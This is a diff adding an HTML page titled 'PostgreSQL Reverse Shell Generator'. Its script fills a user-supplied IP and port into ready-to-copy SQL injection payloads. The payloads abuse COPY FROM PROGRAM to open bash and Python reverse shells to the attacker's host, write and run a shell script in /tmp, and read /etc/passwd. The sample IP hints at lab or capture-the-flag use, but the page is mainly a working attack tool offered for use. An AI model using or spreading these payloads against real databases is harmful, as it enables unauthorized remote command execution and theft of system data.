@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PostgreSQL Reverse Shell Generator</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f5f5f5;
+            color: #333;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .container {
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            padding: 2rem;
+            width: 90%;
+            max-width: 800px;
+        }
+        h1 {
+            color: #27ae60;
+            margin-bottom: 0.5rem;
+            text-align: center;
+        }
+        .credit {
+            color: #7f8c8d;
+            font-size: 0.9rem;
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+        .input-group {
+            margin-bottom: 1.5rem;
+        }
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+        }
+        input {
+            width: 100%;
+            padding: 0.6rem;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 1rem;
+        }
+        .payload-container {
+            margin-top: 2rem;
+        }
+        .payload {
+            background-color: #f9f9f9;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 1rem;
+            margin-bottom: 1.5rem;
+            position: relative;
+            font-family: monospace;
+            white-space: pre-wrap;
+        }
+        .copy-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background-color: #3498db;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            padding: 0.3rem 0.6rem;
+            cursor: pointer;
+            font-size: 0.8rem;
+        }
+        .copy-btn:hover {
+            background-color: #2980b9;
+        }
+        .payload-title {
+            font-weight: 600;
+            margin-bottom: 0.5rem;
+            color: #2c3e50;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>PostgreSQL Reverse Shell Generator</h1>
+        <p class="credit">Made by Aryan Giri</p>
+
+        <div class="input-group">
+            <label for="ip">Your IP:</label>
+            <input type="text" id="ip" placeholder="e.g., 10.10.16.38">
+        </div>
+        <div class="input-group">
+            <label for="port">Your Port:</label>
+            <input type="text" id="port" placeholder="e.g., 4444">
+        </div>
+
+        <div class="payload-container" id="payloads">
+            <!-- Payloads will be inserted here by JavaScript -->
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const ipInput = document.getElementById('ip');
+            const portInput = document.getElementById('port');
+            const payloadsContainer = document.getElementById('payloads');
+
+            // PostgreSQL payload templates (with placeholders)
+            const payloads = [
+                {
+                    title: "1. Direct Reverse Shell (Bash)",
+                    template: "'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'bash -c \\\"bash -i >& /dev/tcp/{IP}/{PORT} 0>&1\\\"'; --"
+                },
+                {
+                    title: "2. Write and Execute a Script",
+                    template: "'; COPY (SELECT 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1') TO '/tmp/shell.sh'; COPY cmd_exec FROM PROGRAM 'bash /tmp/shell.sh'; --"
+                },
+                {
+                    title: "3. Python Reverse Shell",
+                    template: "'; COPY cmd_exec FROM PROGRAM 'python -c \\\"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"{IP}\\\",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])\\\"'; --"
+                },
+                {
+                    title: "4. Read/Write Files",
+                    template: "'; CREATE TABLE file_read(content text); COPY file_read FROM '/etc/passwd'; SELECT * FROM file_read; --"
+                }
+            ];
+
+            // Update payloads when IP or port changes
+            function updatePayloads() {
+                const ip = ipInput.value.trim();
+                const port = portInput.value.trim();
+
+                payloadsContainer.innerHTML = '';
+
+                payloads.forEach(p => {
+                    let payload = p.template.replace(/\{IP\}/g, ip).replace(/\{PORT\}/g, port);
+
+                    const payloadDiv = document.createElement('div');
+                    payloadDiv.className = 'payload';
+                    payloadDiv.innerHTML = `
+                        <div class="payload-title">${p.title}</div>
+                        <code>${payload}</code>
+                        <button class="copy-btn" data-payload="${payload.replace(/"/g, '&quot;')}">Copy</button>
+                    `;
+                    payloadsContainer.appendChild(payloadDiv);
+                });
+
+                // Add copy functionality
+                document.querySelectorAll('.copy-btn').forEach(btn => {
+                    btn.addEventListener('click', function() {
+                        const payload = this.getAttribute('data-payload');
+                        navigator.clipboard.writeText(payload).then(() => {
+                            this.textContent = 'Copied!';
+                            setTimeout(() => this.textContent = 'Copy', 2000);
+                        });
+                    });
+                });
+            }
+
+            // Update payloads on input change
+            ipInput.addEventListener('input', updatePayloads);
+            portInput.addEventListener('input', updatePayloads);
+
+            // Initial update
+            updatePayloads();
+        });
+    </script>
+</body>
+</html>
